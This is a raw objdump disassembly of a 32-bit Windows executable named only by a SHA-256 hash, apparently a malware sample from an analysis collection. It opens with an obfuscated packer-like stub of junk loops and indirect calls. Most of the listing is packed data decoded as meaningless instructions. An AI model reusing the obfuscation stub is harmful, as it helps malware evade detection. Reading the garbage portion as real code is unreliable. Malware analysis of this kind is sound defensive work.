
d9aca70fc4d8643b5da9b578a53f50b1f72c2e653a3a4dd132c3d4d9bab3c492.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fc8d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fc89,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e09c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fc71,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fc59,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fc59
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fc59,ecx
  401068:	cmp    DWORD PTR ds:0x42fc59,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fc59,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e4a7
  401090:	cmp    DWORD PTR ds:0x42fc59,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fc59
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fc59,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e0a4,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e68b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e67b,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e67b,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e67b,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e0a8
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e24f
  401100:	cmp    DWORD PTR ds:0x42e67b,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e67b
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e67b,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e67b
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e67b,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e09c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e09c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e09c,esi
  401145:	cmp    DWORD PTR ds:0x42e09c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e4ab
  401160:	cmp    DWORD PTR ds:0x42e09c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e09c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e09c,esi
  40117c:	cmp    DWORD PTR ds:0x42e09c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e0b4,0x1a
  401193:	cmp    DWORD PTR ds:0x42e0b4,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e0b4,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fcfa
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd02
  4011bf:	push   0x17d1
  4011c4:	push   0x42e1a7
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e3cb
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e0b4
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e0b4,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e67b,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fc85
  4011f8:	adc    esi,DWORD PTR ds:0x42fc89
  4011fe:	mov    DWORD PTR ds:0x42fc85,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e683,0x17
  401216:	cmp    DWORD PTR ds:0x42e683,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e683,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e146
  401238:	push   0x42e0fd
  40123d:	call   DWORD PTR ds:0x42e4af
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e683
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e683,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fcfe,0x12
  40126b:	cmp    DWORD PTR ds:0x42fcfe,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fcfe,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e1a7
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e4b3
  4012a0:	mov    esi,DWORD PTR ds:0x42fcfe
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fcfe,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	fld    QWORD PTR [ebx+0x707067af]
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	xchg   ecx,eax
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	add    al,0x7f
  4013a9:	imul   edi,edi,0x12df82f0
  4013af:	enter  0x259a,0x24
  4013b3:	repz leave 
  4013b5:	mul    DWORD PTR [ebp+eax*4-0x58]
  4013b9:	mov    db6,esi
  4013bc:	fsubr  DWORD PTR [eax-0x6b]
  4013bf:	mov    ch,0x3e
  4013c1:	repnz dec edx
  4013c3:	adc    bl,BYTE PTR [ebx]
  4013c5:	je     0x4013c5
  4013c7:	in     eax,0x85
  4013c9:	xchg   ebp,eax
  4013ca:	dec    esp
  4013cb:	jnp    0x401362
  4013cd:	adc    bh,BYTE PTR [ebx+eiz*4-0xa]
  4013d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013d2:	(bad)  
  4013d3:	outs   dx,BYTE PTR ds:[esi]
  4013d4:	sbb    BYTE PTR [ebp+ecx*4+0xe],dh
  4013d8:	rol    DWORD PTR [edx+ecx*4],1
  4013db:	mov    ah,0x30
  4013dd:	dec    ebx
  4013de:	pusha  
  4013df:	inc    esi
  4013e0:	out    dx,ax
  4013e2:	leave  
  4013e3:	nop
  4013e4:	mov    bl,0xfb
  4013e6:	into   
  4013e7:	stos   DWORD PTR es:[edi],eax
  4013e8:	cmp    eax,DWORD PTR [edi]
  4013ea:	pop    edi
  4013eb:	int3   
  4013ec:	mov    eax,ds:0xafe90850
  4013f1:	add    cl,cl
  4013f3:	mov    cl,0xa8
  4013f5:	or     ch,cl
  4013f7:	mov    ebp,ebp
  4013f9:	adc    al,0x4a
  4013fb:	and    ch,BYTE PTR [ecx-0x30]
  4013fe:	mov    WORD PTR [ecx],cs
  401400:	pop    es
  401401:	add    BYTE PTR [ecx-0x68],0xef
  401405:	cmp    DWORD PTR [ebp-0x22139406],ebp
  40140b:	push   ebx
  40140c:	adc    DWORD PTR [eax+0x54],esp
  40140f:	mov    cl,0xb8
  401411:	aam    0x3b
  401413:	imul   eax,DWORD PTR ds:[edi],0xbabf7537
  40141a:	sub    DWORD PTR [eax],esp
  40141c:	imul   esp,edi,0xdd6e4744
  401422:	cmp    BYTE PTR [edi+0x46],0x56
  401426:	cdq    
  401427:	dec    ebp
  401428:	xchg   BYTE PTR [ecx+0x6e],dl
  40142b:	xchg   BYTE PTR [edi-0x323abec4],bh
  401431:	sub    DWORD PTR ds:0xbdc9,esp
  401436:	add    edx,DWORD PTR [edi-0x20baf4a1]
  40143c:	popa   
  40143d:	mov    dl,0x7a
  40143f:	mov    ds,edx
  401441:	or     al,0xce
  401443:	scas   al,BYTE PTR es:[edi]
  401444:	mov    ebx,0x5cd4d85b
  401449:	dec    edx
  40144a:	xor    DWORD PTR [eax+0x32],esi
  40144d:	push   eax
  40144e:	xchg   ebx,eax
  40144f:	les    ebp,FWORD PTR [eax]
  401451:	push   eax
  401452:	mov    bh,0x32
  401454:	mov    al,0x73
  401456:	inc    esi
  401457:	pop    esp
  401458:	xchg   esi,eax
  401459:	push   esi
  40145a:	imul   edx,DWORD PTR [edi-0x71],0xcfb8377
  401461:	or     dh,ch
  401463:	jg     0x401477
  401465:	cmp    edi,DWORD PTR [ebp-0x41]
  401468:	pop    esi
  401469:	arpl   WORD PTR cs:[ecx-0x34],bp
  40146d:	push   es
  40146e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40146f:	test   eax,0x84e4f703
  401474:	inc    edi
  401475:	mov    dl,bh
  401477:	mov    ah,0x9b
  401479:	jns    0x4014a5
  40147b:	call   0x9b41:0x523a5c2f
  401482:	jl     0x4014f8
  401484:	mov    ah,BYTE PTR [ecx+0x1b125d50]
  40148a:	push   es
  40148b:	pushf  
  40148c:	adc    dh,BYTE PTR [edx+ebx*4-0x6b234b94]
  401493:	jl     0x401491
  401495:	jmp    0x5b38be7b
  40149a:	nop
  40149b:	cmp    BYTE PTR [ecx+0x4940f70d],bh
  4014a1:	push   ss
  4014a2:	xlat   BYTE PTR ds:[ebx]
  4014a3:	in     al,dx
  4014a4:	jg     0x4014b4
  4014a6:	push   ebp
  4014a7:	(bad)  
  4014a8:	loope  0x4014ab
  4014aa:	jo     0x4014be
  4014ac:	popf   
  4014ad:	mov    cl,0x71
  4014af:	bound  esi,QWORD PTR [ecx+0x6f97a120]
  4014b5:	xchg   edx,eax
  4014b6:	jo     0x401494
  4014b8:	(bad)  
  4014b9:	cs sbb eax,0x540603ad
  4014bf:	or     DWORD PTR [edi+edx*4+0x37],esp
  4014c3:	daa    
  4014c4:	inc    edi
  4014c5:	push   ss
  4014c6:	add    al,0x1f
  4014c8:	xchg   edx,eax
  4014c9:	cmp    eax,0xb4e372cf
  4014ce:	sti    
  4014cf:	test   DWORD PTR [edx],edx
  4014d1:	mov    esp,0xd202ebe1
  4014d6:	inc    esi
  4014d7:	popf   
  4014d8:	icebp  
  4014d9:	jne    0x4014bd
  4014db:	(bad)  
  4014dc:	retfw  
  4014de:	pop    ecx
  4014df:	fwait
  4014e0:	pop    es
  4014e1:	cli    
  4014e2:	jmp    0xeb0d7d71
  4014e7:	jne    0x40149e
  4014e9:	into   
  4014ea:	loop   0x4014b7
  4014ec:	ins    DWORD PTR es:[edi],dx
  4014ed:	call   FWORD PTR [ebp-0x2d08d9cb]
  4014f3:	js     0x4014e4
  4014f5:	loopne 0x40153c
  4014f7:	lea    eax,[eax+0x64]
  4014fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014fb:	(bad)  
  4014fc:	mov    dl,0x0
  4014fe:	lahf   
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x7ccae013]
  401516:	out    dx,eax
  401517:	push   DWORD PTR [eax+0x7e]
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	jae    0x40159e
  401522:	jo     0x40159e
  401524:	pop    edi
  401525:	sub    al,0xc5
  401527:	pop    esi
  401528:	push   ss
  401529:	add    DWORD PTR [ecx-0x4336ae18],esi
  40152f:	bound  eax,QWORD PTR [edx-0x4c]
  401532:	and    BYTE PTR [ebx+0x75997f35],dl
  401538:	fsub   QWORD PTR [edx+eiz*8+0x14]
  40153c:	dec    ecx
  40153d:	les    ecx,FWORD PTR [ecx+esi*2+0x35]
  401541:	mov    esi,0x12e65375
  401546:	icebp  
  401547:	sbb    al,0x63
  401549:	je     0x40155f
  40154b:	adc    BYTE PTR [ebx],ah
  40154d:	test   DWORD PTR [ecx+ebx*1+0x13],edi
  401551:	outs   dx,DWORD PTR ds:[esi]
  401552:	pop    es
  401553:	fyl2x  
  401555:	loope  0x401542
  401557:	inc    edi
  401558:	adc    BYTE PTR [ebx+0x2b8c4ba2],0xb6
  40155f:	push   0xffffff8e
  401561:	sub    bh,bl
  401563:	and    dh,BYTE PTR [esi]
  401565:	(bad)  
  401566:	fs psrlw mm3,mm5
  40156a:	out    dx,eax
  40156b:	nop
  40156c:	mov    ah,0x4e
  40156e:	mov    BYTE PTR [edx+0x4cdc6a54],cl
  401574:	mov    esi,0x64941249
  401579:	imul   dl
  40157b:	into   
  40157c:	dec    eax
  40157d:	jno    0x401593
  40157f:	dec    eax
  401580:	sbb    esi,DWORD PTR [ecx]
  401582:	mov    WORD PTR [ebp+0x17e2847f],ss
  401588:	pop    ss
  401589:	mov    ah,0x41
  40158b:	leave  
  40158c:	mov    esp,0xbe110c4f
  401591:	test   eax,0xb5425f25
  401596:	dec    edx
  401597:	mov    esp,0x2c0c89fc
  40159c:	sti    
  40159d:	loopne 0x40159c
  40159f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015a0:	in     eax,dx
  4015a1:	add    bl,BYTE PTR [edi-0x73e01594]
  4015a7:	cmp    bl,BYTE PTR [ebx]
  4015a9:	sbb    al,0x39
  4015ab:	in     eax,0xe4
  4015ad:	test   DWORD PTR [ebx+esi*8+0x18093ae7],edx
  4015b4:	xchg   esp,eax
  4015b5:	mov    ebp,0xbb2a2da8
  4015ba:	fimul  DWORD PTR [esi+0x156b447b]
  4015c0:	imul   ecx,ebp,0x7023d62c
  4015c6:	nop
  4015c7:	jp     0x401572
  4015c9:	or     esp,DWORD PTR [esi]
  4015cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015cc:	xor    DWORD PTR [edi+ebx*8+0x7393ff71],0xf0640054
  4015d7:	(bad)  
  4015d8:	ss cwde 
  4015da:	popf   
  4015db:	bnd jae 0x4015a7
  4015de:	and    eax,0xfbf95290
  4015e3:	pop    edi
  4015e4:	cwde   
  4015e5:	fstp   st(1)
  4015e7:	mov    ds:0x429225c7,al
  4015ec:	pop    edx
  4015ed:	rcr    DWORD PTR [edx],0x46
  4015f0:	dec    ebx
  4015f1:	dec    esi
  4015f2:	sbb    BYTE PTR [edi+0x50485f28],dl
  4015f8:	dec    ecx
  4015f9:	xchg   al,ah
  4015fb:	jle    0x401678
  4015fd:	cmc    
  4015fe:	mov    dh,0x0
  401600:	(bad)
  401604:	clc    
  401605:	pop    eax
  401606:	hlt    
  401607:	pop    edx
  401608:	ret    
  401609:	aam    0xd
  40160b:	or     al,0x91
  40160d:	cmp    DWORD PTR [ebp-0x68c2f24c],ecx
  401613:	jnp    0x4015e7
  401615:	dec    edi
  401616:	jb     0x4015f9
  401618:	loopne 0x401603
  40161a:	mov    ecx,0xd30b1747
  40161f:	adc    ebp,DWORD PTR [edx-0x694e6569]
  401625:	scas   eax,DWORD PTR es:[edi]
  401626:	mov    cl,0xd5
  401628:	or     al,0xdd
  40162a:	cmp    dh,dl
  40162c:	jb     0x40167a
  40162e:	jne    0x401659
  401630:	inc    esp
  401631:	shl    BYTE PTR [ecx],0xfe
  401634:	mov    edx,0x665423cf
  401639:	inc    eax
  40163a:	pop    ebp
  40163b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40163c:	jb     0x4015f1
  40163e:	repnz (bad) [esi-0x73e018c3]
  401645:	ja     0x401689
  401647:	sub    al,0x78
  401649:	fnstenv [edx+0x50]
  40164c:	ficom  WORD PTR [ebp+0x858bcb0]
  401652:	mov    esi,DWORD PTR [ecx+0x52]
  401655:	or     al,0x7e
  401657:	icebp  
  401658:	push   es
  401659:	ficom  WORD PTR [ebp-0x21]
  40165c:	xor    cl,BYTE PTR [ecx-0x70]
  40165f:	mov    ebx,0x3e5334bb
  401664:	pop    ds
  401665:	in     al,0x39
  401667:	jnp    0x401634
  401669:	adc    al,cl
  40166b:	cmp    eax,DWORD PTR [esi]
  40166d:	(bad)  
  40166e:	xlat   BYTE PTR ds:[ebx]
  40166f:	cmp    BYTE PTR [edi+0x6a100c12],bh
  401675:	jp     0x401680
  401677:	xchg   ecx,eax
  401678:	cmp    BYTE PTR [edx],al
  40167a:	clc    
  40167b:	fwait
  40167c:	adc    al,0x32
  40167e:	xchg   bh,bl
  401680:	sar    DWORD PTR [eax+0x1f],1
  401683:	xchg   ecx,eax
  401684:	mov    esi,0x61a85c66
  401689:	push   edi
  40168a:	ins    BYTE PTR es:[edi],dx
  40168b:	adc    dh,bh
  40168d:	imul   ebx,DWORD PTR [esi+0x426d90cb],0xffffffc5
  401694:	enter  0x92fe,0xb2
  401698:	iret   
  401699:	add    eax,0x1d5b28ef
  40169e:	out    dx,al
  40169f:	fnstenv ds:0x4d27e8bc
  4016a5:	pop    ds
  4016a6:	in     eax,0x9a
  4016a8:	jmp    0x7bd7:0xb78199a7
  4016af:	adc    DWORD PTR [edi+0x4c3c66b],ecx
  4016b5:	les    esp,FWORD PTR ds:0x3e554261
  4016bb:	ror    BYTE PTR [eax-0x4d826257],1
  4016c1:	mov    edi,DWORD PTR [esi-0x87784c0]
  4016c7:	pop    ebx
  4016c8:	pop    esi
  4016c9:	iret   
  4016ca:	pop    ss
  4016cb:	lods   al,BYTE PTR ds:[esi]
  4016cc:	shl    bl,0xea
  4016cf:	jl     0x4016f1
  4016d1:	push   ds
  4016d2:	addr16 call 0x3770:0x1f234548
  4016da:	or     eax,0x4ddd9444
  4016df:	and    DWORD PTR [edi-0x310ce618],ebp
  4016e5:	add    BYTE PTR [edi+0x6caded27],bl
  4016eb:	pop    ebp
  4016ec:	pop    ss
  4016ed:	dec    eax
  4016ee:	ins    BYTE PTR es:[edi],dx
  4016ef:	(bad)  
  4016f0:	jge    0x401703
  4016f2:	cmp    BYTE PTR ds:0xf2838fe6,ch
  4016f8:	lods   eax,DWORD PTR ds:[esi]
  4016f9:	adc    BYTE PTR [ebp+0x1b],dl
  4016fc:	std    
  4016fd:	sbb    ch,BYTE PTR [edx]
  4016ff:	lods   al,BYTE PTR gs:[esi]
  401701:	pop    ds
  401702:	sub    edi,DWORD PTR [edi+0x55]
  401705:	(bad)  
  401706:	xor    esi,DWORD PTR [eax]
  401708:	or     esp,ebp
  40170a:	push   ebx
  40170b:	(bad)  
  40170d:	fst    DWORD PTR ds:0x46440cc
  401713:	sbb    al,0xe0
  401715:	bnd jbe 0x401717
  401718:	mov    bl,0xab
  40171a:	clc    
  40171b:	dec    ebp
  40171c:	pop    esp
  40171d:	jb     0x401755
  40171f:	mov    esi,0x89d0458d
  401724:	inc    ebp
  401725:	int3   
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	daa    
  401741:	aad    0x29
  401743:	mov    al,ds:0x70707c70
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	pop    es
  40174d:	daa    
  40174e:	or     eax,0xf21f858a
  401753:	lods   al,BYTE PTR ds:[esi]
  401754:	jo     0x401741
  401756:	js     0x4017a7
  401758:	mov    BYTE PTR [ebx-0x12e2ebc7],cl
  40175e:	push   ecx
  40175f:	int    0xe4
  401761:	fistp  WORD PTR [edi]
  401763:	das    
  401764:	xchg   ecx,eax
  401765:	ret    
  401766:	test   BYTE PTR [ecx+0x7ef535bb],ch
  40176c:	or     ebp,ebp
  40176e:	jge    0x40176f
  401770:	in     eax,dx
  401771:	dec    ecx
  401772:	inc    edi
  401773:	xlat   BYTE PTR ds:[ebx]
  401774:	sub    eax,0x66e8bfa8
  401779:	or     eax,0x38f29290
  40177e:	inc    ebx
  40177f:	in     al,dx
  401780:	inc    ecx
  401781:	add    al,0xde
  401783:	xor    eax,0x43797196
  401788:	leave  
  401789:	cmp    dl,dh
  40178b:	pop    esi
  40178c:	mov    ebx,0x5a5b9acd
  401791:	pop    es
  401792:	inc    eax
  401793:	or     eax,0xf581adb2
  401798:	inc    eax
  401799:	ret    0x1480
  40179c:	push   esi
  40179d:	jge    0x401795
  40179f:	test   ebp,eax
  4017a1:	push   esi
  4017a2:	cmp    DWORD PTR [edx],eax
  4017a4:	sar    ebp,1
  4017a6:	dec    esi
  4017a7:	repnz arpl bp,si
  4017aa:	push   eax
  4017ab:	add    dh,dl
  4017ad:	cmp    DWORD PTR [edi],0x9299d524
  4017b3:	push   ebx
  4017b4:	stos   DWORD PTR es:[edi],eax
  4017b5:	fwait
  4017b6:	cwde   
  4017b7:	loop   0x401798
  4017b9:	mov    bl,0x2b
  4017bb:	(bad)  
  4017bd:	es sbb eax,0x6cde7fa9
  4017c3:	popa   
  4017c4:	mov    ah,BYTE PTR [edx]
  4017c6:	xor    DWORD PTR [edx],ebx
  4017c8:	jp     0x4017e6
  4017ca:	(bad)  
  4017cb:	push   ss
  4017cc:	outs   dx,BYTE PTR ds:[esi]
  4017cd:	mov    esi,0x2f8494ce
  4017d2:	in     al,0x17
  4017d4:	adc    DWORD PTR [esi+eiz*8-0x6259a309],0x1828e210
  4017df:	stos   BYTE PTR es:[edi],al
  4017e0:	xor    BYTE PTR [eax],dh
  4017e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017e3:	jno    0x401830
  4017e5:	and    eax,0x54bff367
  4017ea:	stc    
  4017eb:	scas   al,BYTE PTR es:[edi]
  4017ec:	jno    0x4017c9
  4017ee:	les    ebp,FWORD PTR [esi+0x40]
  4017f1:	and    ebx,DWORD PTR [esi-0x5b317179]
  4017f7:	xchg   esi,eax
  4017f8:	gs inc eax
  4017fa:	mov    edi,0x1732813a
  4017ff:	add    al,0x9
  401801:	retf   
  401802:	shr    DWORD PTR [ecx+ebx*1+0x31],cl
  401806:	sub    BYTE PTR [eax],ch
  401808:	(bad)  
  40180a:	add    dh,BYTE PTR es:[ebx+0x28]
  40180e:	aam    0xe2
  401810:	or     ah,bl
  401812:	pop    ebp
  401813:	fs push ecx
  401815:	aaa    
  401816:	daa    
  401817:	jo     0x401892
  401819:	not    BYTE PTR [ecx-0x25]
  40181c:	add    esp,eax
  40181e:	daa    
  40181f:	inc    ebp
  401820:	mov    DWORD PTR ds:0xa21c28a7,eax
  401826:	imul   edx,DWORD PTR [ebp+0xfa7d542],0xffffff98
  40182d:	fstp   QWORD PTR [esp+eax*2-0x4a7650dd]
  401834:	mov    ch,0x70
  401836:	dec    edx
  401837:	pop    eax
  401838:	or     BYTE PTR [edi],dl
  40183a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40183b:	xchg   esi,eax
  40183c:	(bad)  
  40183d:	adc    al,0x26
  40183f:	out    0x87,al
  401841:	pop    ds
  401842:	mov    ecx,0x9bb97a07
  401847:	lock nop
  401849:	sub    DWORD PTR [ebp-0x7b],0xffffffa1
  40184d:	dec    ebx
  40184e:	iret   
  40184f:	jb     0x40186d
  401851:	scas   al,BYTE PTR es:[edi]
  401852:	mov    al,ds:0xe63b8772
  401857:	pop    ebp
  401858:	adc    cl,al
  40185a:	aaa    
  40185b:	mov    esp,0x6e23498f
  401860:	sub    al,0x27
  401862:	adc    eax,0x5da741d5
  401867:	pop    edi
  401868:	outs   dx,DWORD PTR ds:[esi]
  401869:	jns    0x4018d1
  40186b:	sub    al,0xe
  40186d:	xchg   esi,eax
  40186e:	loop   0x401816
  401870:	in     eax,dx
  401871:	pop    esi
  401872:	ja     0x40186f
  401874:	add    ecx,DWORD PTR [eax+0x7d]
  401877:	shl    DWORD PTR [ecx+0x19],0xe8
  40187b:	xor    BYTE PTR [edx+0x189e7353],al
  401881:	retf   0x72de
  401884:	addr16 (bad) 
  401886:	pop    esp
  401887:	push   cs
  401888:	(bad)
  40188c:	xor    DWORD PTR [ebx+0x4f],esp
  40188f:	in     al,dx
  401890:	popa   
  401891:	js     0x4018a1
  401893:	stc    
  401894:	ja     0x401853
  401896:	ror    BYTE PTR [esi-0x2c],1
  401899:	pop    esp
  40189a:	aam    0x3f
  40189c:	fidivr WORD PTR [eax+eiz*8]
  40189f:	into   
  4018a0:	sbb    dh,BYTE PTR [ebp-0x6d6eb2cc]
  4018a6:	test   al,0xc1
  4018a8:	xlat   BYTE PTR ds:[ebx]
  4018a9:	and    cl,BYTE PTR [ebx]
  4018ab:	clc    
  4018ac:	clc    
  4018ad:	mov    edx,0x67b4def9
  4018b2:	gs xchg ebp,eax
  4018b4:	cmp    BYTE PTR [eax],dh
  4018b6:	mov    edi,esi
  4018b8:	xchg   ebp,eax
  4018b9:	fcomp  QWORD PTR [ebp-0x35e6ca24]
  4018bf:	adc    eax,0x64547a65
  4018c4:	inc    esi
  4018c5:	ins    BYTE PTR es:[edi],dx
  4018c6:	mov    ecx,0xc67b896e
  4018cb:	aad    0x2f
  4018cd:	fmul   DWORD PTR [eax+esi*1]
  4018d0:	es mov al,0xdc
  4018d3:	and    al,0x7a
  4018d5:	fwait
  4018d6:	jo     0x4018b4
  4018d8:	je     0x401875
  4018da:	and    BYTE PTR [edx+0x6891c9e7],0xa0
  4018e1:	push   0xafa7dd91
  4018e6:	cli    
  4018e7:	shl    DWORD PTR [eax],cl
  4018e9:	dec    ecx
  4018ea:	retf   
  4018eb:	loope  0x4018af
  4018ed:	xchg   BYTE PTR [edi],dl
  4018ef:	leave  
